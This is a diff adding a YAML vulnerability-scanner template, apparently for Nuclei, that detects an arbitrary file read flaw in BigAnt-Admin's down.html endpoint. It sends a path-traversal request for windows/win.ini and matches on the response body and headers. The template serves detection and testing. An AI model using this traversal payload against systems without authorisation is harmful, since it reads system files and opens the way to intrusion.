@@ -1,0 +1,37 @@
+id: bigant-admin-anyfile-read
+
+info:
+  name: BigAnt-Admin Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template checks for an arbitrary file read vulnerability in BigAnt-Admin's down.html endpoint.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Api/Update/down.html?file=../../../../../../../../windows/win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[files]"
+          - "bit app support"
+        part: body
+      - type: word
+        words:
+          - "application/octet-stream"
+        part: header
+      - type: word
+        words:
+          - "filename=win.ini"
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
